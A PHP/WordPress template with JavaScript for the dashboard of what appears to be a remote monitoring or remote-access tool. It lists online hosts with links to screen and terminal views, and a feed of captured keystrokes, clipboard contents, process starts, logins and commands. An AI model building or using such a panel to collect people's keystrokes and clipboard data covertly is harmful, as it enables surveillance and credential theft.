<?php
defined('ABSPATH') || exit;
include WD_THEME_DIR . '/templates/partials/layout-open.php';
?>

<div class="wd-page">
  <div class="wd-page-header">
    <h1 class="wd-page-title">仪表盘</h1>
    <div class="wd-header-right">
      <span class="wd-badge wd-badge--green" id="dash-online-badge">加载中...</span>
    </div>
  </div>

  <!-- 统计卡片：总主机、在线、离线、今日日志数 -->
  <div class="wd-stats-row" id="dash-stats">
    <div class="wd-stat-card wd-stat-card--blue">
      <div class="wd-stat-icon">⬡</div>
      <div><div class="wd-stat-num" id="stat-total">—</div><div class="wd-stat-label">总主机</div></div>
    </div>
    <div class="wd-stat-card wd-stat-card--green">
      <div class="wd-stat-icon">◉</div>
      <div><div class="wd-stat-num" id="stat-online">—</div><div class="wd-stat-label">在线</div></div>
    </div>
    <div class="wd-stat-card wd-stat-card--red">
      <div class="wd-stat-icon">○</div>
      <div><div class="wd-stat-num" id="stat-offline">—</div><div class="wd-stat-label">离线</div></div>
    </div>
    <div class="wd-stat-card wd-stat-card--purple">
      <div class="wd-stat-icon">⌨</div>
      <div><div class="wd-stat-num" id="stat-logs">—</div><div class="wd-stat-label">今日日志</div></div>
    </div>
  </div>

  <div class="wd-two-col">
    <!-- 在线主机表格 -->
    <div class="wd-card">
      <div class="wd-card-header">
        <h2>在线主机</h2>
        <a href="<?= esc_url(get_permalink(get_page_by_path('wd-hosts')->ID)) ?>" class="wd-btn wd-btn--ghost wd-btn--sm">全部主机 →</a>
      </div>
      <div class="wd-card-body wd-p0">
        <table class="wd-table">
          <thead><tr><th>主机名</th><th>IP</th><th>操作</th></tr></thead>
          <tbody id="dash-hosts-tbody"><tr><td colspan="3" class="wd-center wd-muted">加载中...</td></tr></tbody>
        </table>
      </div>
    </div>

    <!-- 最近日志活动流，按时间倒序 -->
    <div class="wd-card">
      <div class="wd-card-header">
        <h2>最近日志</h2>
        <a href="<?= esc_url(get_permalink(get_page_by_path('wd-logs')->ID)) ?>" class="wd-btn wd-btn--ghost wd-btn--sm">全部日志 →</a>
      </div>
      <div class="wd-card-body wd-p0">
        <div class="wd-activity-feed" id="dash-feed">
          <div class="wd-center wd-muted wd-p16">加载中...</div>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
document.getElementById('wd-topbar-title').textContent = '仪表盘';

async function loadDashboard() {
    const [hostsRes, logsRes] = await Promise.all([
        WD.ajax('wd_get_hosts', { page: 1 }),
        WD.ajax('wd_get_logs',  { per_page: 12 }),
    ]);

    if (hostsRes.success) {
        const hosts  = hostsRes.data.items;
        const total  = hostsRes.data.total;
        const online = hosts.filter(h => h.status === 'online').length;

        document.getElementById('stat-total').textContent  = total;
        document.getElementById('stat-online').textContent = online;
        document.getElementById('stat-offline').textContent = total - online;
        document.getElementById('dash-online-badge').textContent = online + ' 台在线';

        const tbody = document.getElementById('dash-hosts-tbody');
        const onlineHosts = hosts.filter(h => h.status === 'online').slice(0, 10);
        tbody.innerHTML = onlineHosts.length ? onlineHosts.map(h => `
            <tr>
              <td><span class="wd-dot wd-dot--green"></span><strong>${escHtml(h.name)}</strong></td>
              <td class="wd-mono wd-sm">${escHtml(h.ip_last)}</td>
              <td>
                <a href="${WD.pages['wd-screen']}?host_id=${h.id}" class="wd-btn wd-btn--xs wd-btn--primary">屏幕</a>
                <a href="${WD.pages['wd-console']}?host_id=${h.id}" class="wd-btn wd-btn--xs wd-btn--blue">终端</a>
              </td>
            </tr>`) .join('') : '<tr><td colspan="3" class="wd-center wd-muted">暂无在线主机</td></tr>';
    }

    if (logsRes.success) {
        document.getElementById('stat-logs').textContent = logsRes.data.total || '0';
        const feed = document.getElementById('dash-feed');
        const items = logsRes.data.items;
        if (!items.length) { feed.innerHTML = '<div class="wd-center wd-muted wd-p16">暂无日志</div>'; return; }

        const typeMap = { keyboard:'键盘', clipboard:'剪贴板', process_start:'进程', login:'登录', cmd_exec:'指令' };
        const colorMap = { keyboard:'purple', clipboard:'yellow', process_start:'green', login:'blue', cmd_exec:'red' };
        feed.innerHTML = items.map(l => {
            const p     = l.payload || {};
            const label = typeMap[l.log_type] || l.log_type;
            const color = colorMap[l.log_type] || 'gray';
            const sum   = l.log_type === 'keyboard'      ? (p.text||'').slice(0,50)
                        : l.log_type === 'clipboard'     ? (p.content||'').slice(0,50)
                        : l.log_type === 'process_start' ? '启动：' + (p.name||'')
                        : l.log_type === 'login'         ? `${p.username||''} @ ${p.ip||''}`
                        : JSON.stringify(p).slice(0,40);
            return `<div class="wd-feed-item">
                <span class="wd-feed-type wd-type--${color}">${label}</span>
                <span class="wd-feed-content">${escHtml(sum)}</span>
                <span class="wd-feed-time">${l.created_at.slice(11,19)}</span>
            </div>`;
        }).join('');
    }
}

loadDashboard();
setInterval(loadDashboard, 20000);
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
